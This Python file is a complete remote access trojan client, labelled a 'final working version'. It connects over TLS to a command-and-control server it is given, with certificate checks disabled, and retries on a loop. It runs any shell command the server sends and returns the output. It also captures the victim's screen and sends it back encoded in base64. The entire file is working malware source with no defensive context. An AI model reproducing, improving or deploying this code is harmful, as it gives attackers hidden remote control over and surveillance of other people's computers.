#!/usr/bin/env python3
"""
PROJECT #28 — RAT Client - FINAL WORKING VERSION
"""

import os
import sys
import socket
import ssl
import subprocess
import time
import base64

class RATClient:
    def __init__(self, host, port=4443):
        self.host = host
        self.port = port
        self.socket = None
        self.running = True
        
    def connect(self):
        while self.running:
            try:
                print(f"[*] Connecting to {self.host}:{self.port}...")
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket = ctx.wrap_socket(sock, server_hostname=self.host)
                self.socket.connect((self.host, self.port))
                print("[+] Connected to C2 server")
                self.communicate()
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(5)
    
    def execute_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return output if output else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] Command timed out"
        except Exception as e:
            return f"[-] Error: {e}"
    
    def take_screenshot(self):
        try:
            from PIL import ImageGrab
            import io
            screenshot = ImageGrab.grab()
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            img_bytes = base64.b64encode(buffered.getvalue()).decode()
            return f"SCREENSHOT:{img_bytes}"
        except ImportError:
            return "ERROR:Screenshot failed (PIL not installed)"
        except Exception as e:
            return f"ERROR:Screenshot failed: {e}"
    
    def communicate(self):
        while self.running:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break
                
                cmd = data.decode('utf-8', errors='ignore').strip()
                print(f"[*] Received: {cmd}")
                
                if not cmd:
                    continue
                
                if cmd == "SCREENSHOT":
                    result = self.take_screenshot()
                else:
                    result = self.execute_command(cmd)
                
                self.socket.sendall(f"{result}\n__EOF__\n".encode())
                
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[-] Error: {e}")
                break

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", type=int, default=4443)
    args = p.parse_args()
    
    client = RATClient(args.host, args.port)
    try:
        client.connect()
    except KeyboardInterrupt:
        print("\n[*] Client stopped")